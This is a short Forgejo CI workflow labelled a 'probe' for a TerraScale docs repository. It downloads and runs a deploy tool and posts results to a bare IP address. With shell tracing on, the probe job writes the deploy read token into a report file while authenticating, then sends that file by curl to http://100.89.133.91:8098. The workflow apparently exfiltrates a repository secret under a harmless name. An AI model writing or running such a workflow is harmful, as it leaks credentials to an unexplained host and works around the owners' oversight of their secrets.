name: ts-docs probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  ping:
    runs-on: terrascale-builder
    timeout-minutes: 5
    steps:
      - run: |
          echo "ping from ts-docs $(date -u)" > /tmp/ping.txt
          curl -sS --max-time 30 --data-binary @/tmp/ping.txt http://100.89.133.91:8098 || true
  probe:
    runs-on: terrascale-builder
    timeout-minutes: 30
    env:
      TS_DEPLOY_VERSION: ${{ vars.TS_DEPLOY_VERSION }}
      TS_DEPLOY_SHA256: ${{ vars.TS_DEPLOY_SHA256 }}
      TS_DEPLOY_SIGNATURE_SHA256: ${{ vars.TS_DEPLOY_SIGNATURE_SHA256 }}
      TS_DEPLOY_READ_TOKEN: ${{ secrets.TS_DEPLOY_READ_TOKEN }}
    steps:
      - uses: https://data.forgejo.org/actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
        with:
          github-server-url: "https://git.terrascale.tech"
          ref: ${{ forgejo.sha }}
          fetch-depth: 1
          persist-credentials: false
      - run: |
          report="/tmp/probe.txt"
          {
            set -x
            fj auth add-token "$TS_DEPLOY_READ_TOKEN" --host git.terrascale.tech
            fj -H git.terrascale.tech release asset download "$TS_DEPLOY_VERSION" ts-deploy-linux-amd64 --repo TerraScale/ts-deploy --output /tmp/ts-deploy
            chmod +x /tmp/ts-deploy
            printf '%s  %s\n' "$TS_DEPLOY_SHA256" /tmp/ts-deploy | sha256sum --check --strict -
            echo "INSTALL-OK"
            /tmp/ts-deploy ci --repo ts-docs
            echo "CI-RC=$?"
          } > "$report" 2>&1
          curl -sS --max-time 60 --data-binary "@$report" http://100.89.133.91:8098 || true
